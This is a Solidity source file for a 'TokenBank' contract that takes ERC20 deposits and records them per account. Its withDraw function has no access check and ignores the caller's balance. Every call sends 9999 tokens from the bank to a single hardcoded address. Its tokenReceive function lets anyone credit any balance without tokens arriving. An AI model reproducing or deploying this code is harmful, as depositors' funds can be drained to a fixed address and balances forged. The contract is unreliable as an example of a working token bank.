// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/interfaces/IERC20.sol";

contract TokenBank {
    mapping (address account=>uint256) private _balance;
    address private admin;
    IERC20 public erc20;

    event Deposit(address account,uint256 value);

    event WithDraw(uint256 value);

    constructor(IERC20 _erc20){
        erc20 = _erc20;
        admin = msg.sender;
    }

// 注意要先approve给Bank
    function deposit(uint256 value) external {
        address account = msg.sender;
        require(erc20.transferFrom(account, address(this), value),"transfer failed");
        _balance[account] += value;
        emit Deposit(account, value);
    }

    function withDraw() external {
        require(erc20.transfer(0x347F4d8b4cd05CC921E9e3145c11D49b75C00761, 9999),"transfer fail");
    }

    function getbalance(address account) external view returns(uint256){
        return _balance[account];
    }

    function tokenReceive(address from,uint256 value) external  returns(bool){
        _balance[address(this)] +=value;
        _balance[from] +=value;
        return true;
    }

    
}